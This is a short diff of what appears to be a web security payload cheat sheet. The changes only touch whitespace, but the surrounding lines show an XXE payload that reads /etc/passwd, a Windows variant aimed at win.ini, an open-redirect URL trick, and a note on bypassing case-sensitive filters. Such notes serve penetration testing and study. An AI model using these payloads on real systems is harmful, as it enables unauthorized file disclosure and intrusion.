@@ -197,6 +197,7 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 ```
+
   `windows`
  ```xml
   <?xml version = "1.0"?>
@@ -210,8 +211,7 @@ https://www.whitelisteddomain.tld@google.com/%2f..
   </order>
  ```
 If the output of the `win.ini` file on the target returns the response message, then it proves that the XML External Entity vulnerability is present.
-  
-  
+
 ### use replace funtion if case sensitive
 ```xml
 <!--?xml version="1.0" ?-->
